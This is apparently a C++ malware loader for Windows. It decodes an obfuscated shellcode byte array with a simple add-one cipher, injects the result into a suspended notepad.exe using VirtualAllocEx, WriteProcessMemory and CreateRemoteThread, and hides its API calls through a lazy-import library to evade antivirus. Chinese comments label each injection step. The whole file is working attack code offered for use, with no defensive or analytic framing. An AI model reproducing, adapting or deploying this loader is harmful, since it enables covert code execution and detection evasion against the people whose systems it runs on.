#include <stdio.h>
#include <windows.h>
#include <iostream>
#include "lazy_importer.hpp"



unsigned char buf[] = "\xfb\x47\x82\xe3\xef\xe7\xcb\xff\xff\xff\x40\x50\x40\x4f\x51\x47\x30\xd1\x50\x64\x47\x8a\x51\x5f\x47\x8a\x51\x17\x47\x8a\x51\x1f\x55\x47\x8a\x71\x4f\x47\x0e\xb6\x49\x49\x4c\x30\xc8\x47\x30\xbf\xab\x3b\x60\x7b\x01\x2b\x1f\x40\xc0\xc8\x0c\x40\x00\xc0\xe1\xec\x51\x40\x50\x47\x8a\x51\x1f\x8a\x41\x3b\x47\x00\xcf\x65\x80\x77\x17\x0a\x01\x0e\x84\x71\xff\xff\xff\x8a\x7f\x87\xff\xff\xff\x47\x84\xbf\x73\x66\x47\x00\xcf\x4f\x43\x8a\x3f\x1f\x48\x00\xcf\x8a\x47\x17\xe2\x55\x47\xfe\xc8\x4c\x30\xc8\x40\x8a\x33\x87\x47\x00\xd5\x47\x30\xbf\x40\xc0\xc8\x0c\xab\x40\x00\xc0\x37\xdf\x74\xf0\x4b\x02\x4b\x23\x07\x44\x38\xd0\x74\xd7\x57\x43\x8a\x3f\x23\x48\x00\xcf\x65\x40\x8a\x0b\x47\x43\x8a\x3f\x1b\x48\x00\xcf\x40\x8a\x03\x87\x40\x57\x47\x00\xcf\x40\x57\x5d\x58\x59\x40\x57\x40\x58\x40\x59\x47\x82\xeb\x1f\x40\x51\xfe\xdf\x57\x40\x58\x59\x47\x8a\x11\xe8\x4a\xfe\xfe\xfe\x5c\x48\xbd\x76\x72\x31\x5e\x32\x31\xff\xff\x40\x55\x48\x88\xe5\x47\x80\xeb\x9f\x00\xff\xff\x48\x88\xe4\x48\xbb\x01\xff\x04\x38\xbf\xa7\x40\x9d\x40\x53\x48\x88\xe3\x4b\x88\xf0\x40\xb9\x4b\x76\x25\x06\xfe\xd4\x4b\x88\xe9\x67\x00\x00\xff\xff\x58\x40\xb9\x28\x7f\x6a\xff\xfe\xd4\x69\x09\x40\x5d\x4f\x4f\x4c\x30\xc8\x4c\x30\xbf\x47\xfe\xbf\x47\x88\xc1\x47\xfe\xbf\x47\x88\xc0\x40\xb9\xe9\x0e\xde\xdf\xfe\xd4\x47\x88\xc6\x69\x0f\x40\x57\x4b\x88\xe1\x47\x88\xf8\x40\xb9\x98\xa4\x73\x60\xfe\xd4\x84\xbf\x73\x09\x48\xfe\xcd\x74\xe4\xe7\x92\xff\xff\xff\x47\x82\xeb\x0f\x47\x88\xe1\x4c\x30\xc8\x69\x03\x40\x57\x47\x88\xf8\x40\xb9\x01\xd8\xc7\x5e\xfe\xd4\x82\xf7\xff\x7d\x54\x47\x82\xc3\x1f\x5d\x88\xf5\x69\x3f\x40\x58\x67\xff\x0f\xff\xff\x40\x57\x47\x88\xf1\x47\x30\xc8\x40\xb9\x57\xa3\x52\xe4\xfe\xd4\x47\x88\xc2\x48\x88\xc6\x4c\x30\xc8\x48\x88\xef\x47\x88\xd9\x47\x88\xf8\x40\xb9\x01\xd8\xc7\x5e\xfe\xd4\x82\xf7\xff\x7c\x27\x57\x40\x56\x58\x67\xff\x3f\xff\xff\x40\x57\x69\xff\x59\x40\xb9\x0a\x2e\x0e\x2f\xfe\xd4\x56\x58\x40\xb9\x74\x6d\x4c\x60\xfe\xd4\x48\xfe\xcd\xe8\x3b\xfe\xfe\xfe\x47\x00\xc2\x47\x28\xc5\x47\x84\xf5\x74\xb3\x40\xfe\xe6\x57\x69\xff\x58\x48\xc6\xc1\xef\xb4\xa1\x55\xfe\xd4";



int main()
{

    
    int password = 1025;
    int nLen = sizeof(buf) - 1;
    
    unsigned char shellcode[sizeof(buf)];
    
    for (int i = 0; i < nLen; i++) {
        
        shellcode[i] = buf[i] + password;
    }


    // 创建一个目标进程
    STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInfo;
    LI_FN(memset)(&startupInfo, 0, sizeof(startupInfo));
    LI_FN(memset)(&processInfo, 0, sizeof(processInfo));

    if (!LI_FN(CreateProcessA)(nullptr, const_cast<LPSTR>("C:\\Windows\\System32\\notepad.exe"), nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &startupInfo, &processInfo)) {
        std::cout << "Failed to create process" << std::endl;
        return 1;
    }

    // 在目标进程中分配内存
    LPVOID allocatedMemory = LI_FN(VirtualAllocEx)(processInfo.hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocatedMemory) {
        std::cout << "Failed to allocate memory" << std::endl;
        LI_FN(TerminateProcess)(processInfo.hProcess, 0);
        return 1;
    }

    // 将Shellcode写入目标进程内存
    if (!LI_FN(WriteProcessMemory)(processInfo.hProcess, allocatedMemory, shellcode, sizeof(shellcode), nullptr)) {
        std::cout << "Failed to write process memory" << std::endl;
        LI_FN(VirtualFreeEx)(processInfo.hProcess, allocatedMemory, 0, MEM_RELEASE);
        TerminateProcess(processInfo.hProcess, 0);
        return 1;
    }

    // 在目标进程中创建远程线程，以执行Shellcode
    HANDLE remoteThread = LI_FN(CreateRemoteThread)(processInfo.hProcess, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(allocatedMemory), nullptr, 0, nullptr);
    if (!remoteThread) {
        std::cout << "Failed to create remote thread" << std::endl;
        LI_FN(VirtualFreeEx)(processInfo.hProcess, allocatedMemory, 0, MEM_RELEASE);
        TerminateProcess(processInfo.hProcess, 0);
        return 1;
    }

    // 等待远程线程执行完毕
    WaitForSingleObject(remoteThread, INFINITE);

    // 清理资源
    CloseHandle(remoteThread);
    VirtualFreeEx(processInfo.hProcess, allocatedMemory, 0, MEM_RELEASE);
    ResumeThread(processInfo.hThread);
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

    std::cout << "Shellcode executed successfully!" << std::endl;

    return 0;


}
